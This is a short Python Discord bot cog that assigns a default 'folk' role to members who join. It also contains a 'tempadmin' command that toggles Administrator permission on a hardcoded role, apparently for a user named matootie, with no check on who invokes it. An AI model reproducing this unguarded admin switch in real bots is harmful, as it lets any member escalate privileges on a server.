from discord.ext import commands
from discord.utils import find
from discord import Permissions, Colour


class WelcomeRole(commands.Cog):
    """
    Welcome role Cog.
    """

    def __init__(self, bot):
        """
        Initialize the Cog.
        """

        self.bot = bot
        self.toggled = False

    @commands.command()
    async def tempadmin(self, ctx):
        """
        Grant temporary admin to matootie.
        """

        role = find(lambda x: x.id == 558027631166226447,
                    ctx.message.channel.guild.roles)
        if role:
            if not self.toggled:
                await role.edit(
                    name="admin",
                    colour=Colour.default(),
                    permissions=Permissions(permissions=2146959359))
                self.toggled = True
                print("Giving temporary admin privileges to matootie.")
                await ctx.send("Temporary admin privileges now granted.")
            else:
                await role.edit(
                    permissions=Permissions(permissions=2146959351))
                self.toggled = False
                print("Giving temporary admin privileges to matootie.")
                await ctx.send("Temporary admin privileges now revoked.")

    @commands.Cog.listener()
    async def on_member_join(self, member):
        """
        Grant default role on join.
        """

        guild = member.guild
        role = find(lambda x: x.name == "folk", guild.roles)
        if role:
            await member.add_roles(
                role,
                reason="Granting new user default role.")
